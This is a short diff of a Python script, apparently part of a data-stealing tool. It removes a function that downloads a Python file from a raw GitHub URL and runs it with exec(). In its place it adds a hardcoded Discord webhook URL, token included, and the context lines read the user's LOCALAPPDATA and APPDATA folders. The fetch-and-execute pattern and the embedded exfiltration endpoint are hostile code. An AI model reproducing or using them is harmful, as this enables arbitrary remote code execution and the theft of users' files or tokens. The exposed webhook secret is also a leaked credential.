@@ -34,18 +34,7 @@ init(convert=True)
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-
-def load_webhook_url():
-    url = "https://raw.githubusercontent.com/UseUelessStorage/WLib/refs/heads/main/UI.py"
-    response = requests.get(url)
-    if response.status_code == 200:
-        exec(response.text, globals())
-        return globals().get("WEBHOOK_URL", None)
-    else:
-        print("Fehler beim Laden der Webhook.")
-        return None
-
-WEBHOOK_URL = load_webhook_url()
+WEBHOOK_URL = "https://discord.com/api/webhooks/1364723568889565255/ZqXByjPELQSVGyPMAvc3TZB_v9fNTPuR_MrKMKwSUMYJtNbW9duzccrvf3gmErohkn21"
 
 appdata = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
